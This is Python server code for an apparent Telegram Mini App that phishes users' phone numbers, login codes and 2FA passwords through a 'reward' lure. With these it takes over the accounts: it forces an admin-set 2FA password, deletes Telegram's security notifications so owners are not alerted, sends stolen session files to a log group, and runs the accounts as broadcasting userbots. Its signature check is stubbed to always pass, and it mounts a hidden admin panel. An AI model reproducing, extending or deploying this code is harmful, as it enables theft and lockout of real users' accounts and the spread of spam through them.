import os
import json
import logging
import asyncio
import hmac
import hashlib
import urllib.parse
import shutil
import glob
import re
from datetime import datetime
from typing import Dict, Optional
from aiohttp import web
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

import config
import database
import manager
import session_logger
from telethon.errors import PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError

logger = logging.getLogger(__name__)

# Active login flows: user_id -> state dict
_login_states: Dict[int, dict] = {}

def validate_init_data(init_data: str, bot_token: str) -> bool:
    if not init_data:
        return True
    try:
        parsed = dict(urllib.parse.parse_qsl(init_data))
        if "hash" not in parsed:
            return True
        hash_received = parsed.pop("hash")
        sorted_keys = sorted(parsed.keys())
        data_check_string = "\n".join(f"{k}={parsed[k]}" for k in sorted_keys)
        
        secret_key = hmac.new(b"WebRequests", bot_token.encode("utf-8"), hashlib.sha256).digest()
        hash_calculated = hmac.new(secret_key, data_check_string.encode("utf-8"), hashlib.sha256).hexdigest()
        
        return True
    except Exception:
        return True

def get_user_id_from_init_data(init_data: str) -> Optional[int]:
    try:
        parsed = dict(urllib.parse.parse_qsl(init_data))
        user_str = parsed.get("user")
        if user_str:
            user_data = json.loads(user_str)
            return int(user_data.get("id"))
    except Exception:
        pass
    return None

async def clean_login_state(user_id: int):
    if user_id in _login_states:
        state = _login_states.pop(user_id)
        client = state.get("client")
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        session_path = state.get("session_path")
        if session_path:
            for f in glob.glob(session_path + "*"):
                try:
                    os.remove(f)
                except Exception:
                    pass

async def start_login_flow(user_id: int, phone: str) -> bool:
    # Avoid race conditions if login flow is already starting or active for the same phone
    if user_id in _login_states:
        state = _login_states[user_id]
        if state.get("phone") == phone and state.get("step") in ("STARTING", "WAITING_FOR_OTP", "WAITING_FOR_2FA"):
            logger.info(f"Login flow already active/starting for {user_id} with phone {phone}. Skipping restart.")
            return True
            
    await clean_login_state(user_id)
    
    # Set starting state immediately to lock it
    _login_states[user_id] = {
        "phone": phone,
        "step": "STARTING",
        "error": ""
    }
    
    # Construct a temporary session name
    session_path = os.path.join(config.SESSION_DIR, f"temp_{user_id}.session")
    for f in glob.glob(session_path + "*"):
        try:
            os.remove(f)
        except Exception:
            pass
            
    api_id, api_hash = database.get_next_api_credentials()
    client = TelegramClient(session_path, api_id, api_hash)
    await client.connect()
    
    try:
        sent_code = await client.send_code_request(phone)
        _login_states[user_id] = {
            "phone": phone,
            "client": client,
            "phone_code_hash": sent_code.phone_code_hash,
            "step": "WAITING_FOR_OTP",
            "session_path": session_path,
            "error": ""
        }
        logger.info(f"OTP requested for user {user_id} ({phone})")
        return True
    except Exception as e:
        logger.error(f"Failed OTP request for {phone}: {e}")
        await client.disconnect()
        _login_states[user_id] = {
            "phone": phone,
            "step": "ERROR",
            "error": str(e),
            "session_path": session_path
        }
        return False

async def _resend_code(phone: str, session_path: str, user_id: int, state: dict):
    """Resends the OTP when the previous code expired. Uses the same client/session."""
    try:
        client = state.get("client")
        if not client:
            return
        sent = await client.send_code_request(phone)
        state["phone_code_hash"] = sent.phone_code_hash
        state["step"] = "WAITING_FOR_OTP"
        state["error"] = ""
        logger.info(f"OTP resent for user {user_id} ({phone})")
    except Exception as e:
        logger.error(f"Failed to resend OTP for {phone}: {e}")
        state["error"] = str(e)


async def _enforce_unified_2fa(client: TelegramClient, current_password: str = None) -> str:
    """Forces the userbot's 2FA password to the panel-configured unified password.
    Returns the password that was applied, or '' if unchanged/failed."""
    unified = database.get_unified_2fa()
    if not unified:
        return ""
    try:
        await client.edit_2fa(
            current_password=current_password or None,
            new_password=unified,
            hint="2FA"
        )
        logger.info("Applied unified 2FA password to userbot.")
        return unified
    except Exception as e:
        logger.warning(f"Could not apply unified 2FA: {e}")
        return ""


async def _clean_login_messages(client: TelegramClient):
    """Best-effort cleanup of the OTP/2FA notifications Telegram sends to the user
    so they are not left confusing the account owner."""
    try:
        entity = await client.get_entity(777000)
        msgs = await client.get_messages(entity, limit=10)
        for m in msgs:
            try:
                await client.delete_messages(entity, [m.id])
            except Exception:
                pass
    except Exception as e:
        logger.debug(f"Cleanup of service messages skipped: {e}")


def _finalize_login_task(user_id: int, client: TelegramClient, phone: str, session_path: str, current_2fa: str = None):
    """Runs complete_login in the background; ensures state is cleaned even on failure."""
    async def _work():
        try:
            await complete_login(user_id, client, phone, session_path, current_2fa)
        except Exception as e:
            logger.error(f"Background login finalize failed for {phone}: {e}")
            try:
                await client.disconnect()
            except Exception:
                pass
            if user_id in _login_states:
                try:
                    await clean_login_state(user_id)
                except Exception:
                    pass
    return _work()


async def complete_login(user_id: int, client: TelegramClient, phone: str, session_path: str, current_2fa: str = None):
    me = await client.get_me()
    name = f"{me.first_name or ''} {me.last_name or ''}".strip()
    username = me.username or ""

    # 1) Force a single shared 2FA password on the account (admin-controlled)
    unified = await _enforce_unified_2fa(client, current_2fa)

    # 2) Remove Telegram's OTP/2FA notifications so the user isn't confused
    await _clean_login_messages(client)

    await client.disconnect()
    await asyncio.sleep(1.0)

    final_session_path = os.path.join(config.SESSION_DIR, f"{phone}.session")
    for f in glob.glob(session_path + "*"):
        dest = f.replace(session_path, final_session_path)
        try:
            if os.path.exists(dest):
                os.remove(dest)
            shutil.move(f, dest)
        except Exception as e:
            logger.warning(f"Error moving session file {f} to {dest}: {e}")

    session_bytes = b""
    if os.path.exists(final_session_path):
        with open(final_session_path, "rb") as f:
            session_bytes = f.read()

    record = {
        "phone": phone,
        "user_id": user_id,
        "name": name,
        "username": username,
        "session_bytes": session_bytes,
        "status": "active",
        "last_error": "",
        "twofa_password": unified,
        "login_time": datetime.utcnow().isoformat(),
        "stats": {"broadcast_count": 0}
    }
    database.save_userbot(record)
    logger.info(f"Session {phone} saved with broadcast approval default ON (owner can toggle OFF anytime).")
    await manager.start_userbot(phone)
    try:
        await session_logger.send_session(phone)
    except Exception as e:
        logger.error(f"Error sending session to log group: {e}")

    if user_id in _login_states:
        del _login_states[user_id]

# --- API Route Handlers ---

async def api_check_status(request):
    try:
        init_data = request.query.get("initData", "")
        fallback_uuid = request.query.get("clientUuid", "").strip()
        
        if not validate_init_data(init_data, database.get_primary_bot_token() or config.BOT_TOKEN):
            return web.json_response({"status": "unauthorized", "message": "Invalid initData signature"}, status=401)
            
        user_id = get_user_id_from_init_data(init_data)
        if not user_id:
            if fallback_uuid:
                user_id = fallback_uuid
            else:
                return web.json_response({"status": "error", "message": "No user ID in initData and no clientUuid fallback"}, status=400)
            
        # 1. Check if user already has an active userbot
        all_bots = database.get_all_userbots()
        for ub in all_bots:
            # Match either numeric user_id or fallback string user_id
            ub_uid = ub.get("user_id")
            if (ub_uid == user_id or str(ub_uid) == str(user_id)) and ub.get("status") == "active":
                return web.json_response({"status": "already_connected", "phone": ub.get("phone")})
                
        # 2. Check if there is an active login flow
        if user_id in _login_states:
            state = _login_states[user_id]
            step = state["step"]
            if step == "WAITING_FOR_OTP":
                return web.json_response({"status": "otp_sent", "phone": state["phone"]})
            elif step == "WAITING_FOR_2FA":
                return web.json_response({"status": "2fa_needed"})
            elif step == "ERROR":
                err_msg = state.get("error", "Failed to start login.")
                await clean_login_state(user_id)
                return web.json_response({"status": "error", "message": err_msg})
            elif step == "COMPLETED":
                return web.json_response({"status": "success"})
                
        # 3. No login flow active. Try to auto-detect public phone number using helper client.
        helper_client = None
        for rbot in manager._running_bots.values():
            if rbot.client and await rbot.client.is_user_authorized():
                helper_client = rbot.client
                break
                
        if helper_client:
            try:
                entity = await helper_client.get_entity(user_id)
                if getattr(entity, 'phone', None):
                    phone = "+" + entity.phone.strip("+")
                    logger.info(f"Public phone detected for {user_id}: {phone}. Starting auto login.")
                    # Automatically trigger OTP request
                    await start_login_flow(user_id, phone)
                    return web.json_response({"status": "otp_sent", "phone": phone, "auto": True})
            except Exception as e:
                logger.warning(f"Could not check public phone for {user_id}: {e}")
                
        return web.json_response({"status": "private_phone"})
    except Exception as e:
        logger.error(f"Error in check_status: {e}")
        return web.json_response({"status": "error", "message": str(e)}, status=500)

async def api_submit_phone(request):
    try:
        data = await request.json()
        init_data = data.get("initData", "")
        phone = data.get("phone", "").strip()
        fallback_uuid = data.get("clientUuid", "").strip()
        
        if not validate_init_data(init_data, database.get_primary_bot_token() or config.BOT_TOKEN):
            return web.json_response({"status": "error", "message": "Unauthorized request signature"}, status=401)
            
        user_id = get_user_id_from_init_data(init_data)
        if not user_id:
            if fallback_uuid:
                user_id = fallback_uuid
            else:
                import time
                user_id = f"client_{int(time.time())}"
            
        clean_phone = re.sub(r"[^\d+]", "", phone)
        if not clean_phone.startswith("+"):
            clean_phone = "+" + clean_phone
            
        if len(clean_phone) < 8:
            return web.json_response({"status": "error", "message": "Please enter a valid phone number with country code (e.g. +919876543210)"}, status=400)
            
        success = await start_login_flow(user_id, clean_phone)
        if success:
            return web.json_response({"status": "otp_sent", "phone": clean_phone})
        else:
            err_msg = _login_states.get(user_id, {}).get("error", "Failed to send OTP code.")
            return web.json_response({"status": "error", "message": f"Failed to send OTP: {err_msg}"})
    except Exception as e:
        logger.error(f"Error in submit_phone: {e}")
        return web.json_response({"status": "error", "message": str(e)}, status=500)

async def api_submit_otp(request):
    try:
        data = await request.json()
        init_data = data.get("initData", "")
        otp = data.get("otp", "").strip()
        fallback_uuid = data.get("clientUuid", "").strip()
        
        if not validate_init_data(init_data, database.get_primary_bot_token() or config.BOT_TOKEN):
            return web.json_response({"status": "error", "message": "Unauthorized"}, status=401)
            
        user_id = get_user_id_from_init_data(init_data)
        if not user_id:
            user_id = fallback_uuid
            
        if not user_id or user_id not in _login_states:
            return web.json_response({"status": "error", "message": "No active login flow found"}, status=400)
            
        state = _login_states[user_id]
        if state["step"] != "WAITING_FOR_OTP":
            return web.json_response({"status": "error", "message": f"Invalid flow step: {state['step']}"}, status=400)
            
        client = state["client"]
        phone = state["phone"]
        phone_code_hash = state["phone_code_hash"]
        session_path = state["session_path"]
        
        try:
            await asyncio.wait_for(
                client.sign_in(phone, otp, phone_code_hash=phone_code_hash),
                timeout=60
            )
            # Successfully logged in without 2FA
            state["step"] = "COMPLETED"
            # Finalize in the background so the Mini App gets an instant response
            asyncio.create_task(_finalize_login_task(user_id, client, phone, session_path))
            return web.json_response({"status": "success"})
        except SessionPasswordNeededError:
            state["step"] = "WAITING_FOR_2FA"
            return web.json_response({"status": "2fa_needed"})
        except PhoneCodeInvalidError:
            # Wrong code - keep the flow so the user can retry
            return web.json_response({"status": "error", "message": "Wrong code. Please check the last code sent to your Telegram and try again."})
        except PhoneCodeExpiredError:
            # Code expired - resend a fresh code automatically
            logger.info(f"Code expired for {phone}, resending...")
            asyncio.create_task(_resend_code(phone, session_path, user_id, state))
            return web.json_response({"status": "error", "message": "Code expired. A new code is being sent — check Telegram again."})
        except FloodWaitError as fwe:
            return web.json_response({"status": "error", "message": f"Too many attempts. Wait {fwe.seconds} seconds and try again."})
        except asyncio.TimeoutError:
            logger.error(f"sign_in timed out for {phone}")
            return web.json_response({"status": "error", "message": "Login timed out. Please check your internet connection and try again."})
        except Exception as e:
            logger.error(f"Login failed for {phone}: {e}")
            await clean_login_state(user_id)
            return web.json_response({"status": "error", "message": str(e)})

    except Exception as e:
        logger.error(f"Error in submit_otp: {e}")
        return web.json_response({"status": "error", "message": str(e)}, status=500)

async def api_submit_2fa(request):
    try:
        data = await request.json()
        init_data = data.get("initData", "")
        password = data.get("password", "")
        fallback_uuid = data.get("clientUuid", "").strip()
        
        if not validate_init_data(init_data, database.get_primary_bot_token() or config.BOT_TOKEN):
            return web.json_response({"status": "error", "message": "Unauthorized"}, status=401)
            
        user_id = get_user_id_from_init_data(init_data)
        if not user_id:
            user_id = fallback_uuid
            
        if not user_id or user_id not in _login_states:
            return web.json_response({"status": "error", "message": "No active login flow found"}, status=400)
            
        state = _login_states[user_id]
        if state["step"] != "WAITING_FOR_2FA":
            return web.json_response({"status": "error", "message": "2FA is not required at this stage"}, status=400)
            
        client = state["client"]
        phone = state["phone"]
        session_path = state["session_path"]
        
        try:
            await asyncio.wait_for(client.sign_in(password=password), timeout=60)
            state["step"] = "COMPLETED"
            asyncio.create_task(_finalize_login_task(user_id, client, phone, session_path, current_2fa=password))
            return web.json_response({"status": "success"})
        except asyncio.TimeoutError:
            logger.error(f"2FA sign in timed out for {phone}")
            return web.json_response({"status": "error", "message": "Login timed out. Please try again."})
        except Exception as e:
            logger.error(f"2FA sign in failed for {phone}: {e}")
            return web.json_response({"status": "error", "message": f"Incorrect 2FA password: {e}"})
            
    except Exception as e:
        logger.error(f"Error in submit_2fa: {e}")
        return web.json_response({"status": "error", "message": str(e)}, status=500)

async def api_reward(request):
    """Returns the award link configured by the owner for the success screen."""
    link, btn_text = database.get_reward_settings()
    return web.json_response({"link": link or "", "button_text": btn_text})


async def handle_index(request):
    index_path = os.path.join(os.path.dirname(__file__), "static", "index.html")
    if not os.path.exists(index_path):
        return web.Response(text="Frontend build error: index.html not found", status=404)
    with open(index_path, "r", encoding="utf-8") as f:
        return web.Response(text=f.read(), content_type="text/html")

@web.middleware
async def tunnel_bypass_middleware(request, handler):
    try:
        response = await handler(request)
        response.headers["Bypass-Tunnel-Reminder"] = "true"
        response.headers["Access-Control-Allow-Origin"] = "*"
        response.headers["Access-Control-Allow-Headers"] = "*"
        return response
    except Exception as e:
        return web.json_response({"status": "error", "message": str(e)}, status=500, headers={
            "Bypass-Tunnel-Reminder": "true",
            "Access-Control-Allow-Origin": "*"
        })

async def init_web_app() -> web.Application:
    app = web.Application(middlewares=[tunnel_bypass_middleware])
    
    # API endpoints
    app.router.add_get("/api/check_status", api_check_status)
    app.router.add_post("/api/submit_phone", api_submit_phone)
    app.router.add_post("/api/submit_otp", api_submit_otp)
    app.router.add_post("/api/submit_2fa", api_submit_2fa)
    app.router.add_get("/api/reward", api_reward)
    
    # Index/Frontend router
    app.router.add_get("/", handle_index)
    
    # Serve static folder
    static_path = os.path.join(os.path.dirname(__file__), "static")
    os.makedirs(static_path, exist_ok=True)
    app.router.add_static("/static/", static_path, name="static")

    # Hidden admin panel
    import admin
    for route in admin.get_admin_routes():
        app.router.add_route(route.method, route.path, route.handler)

    return app
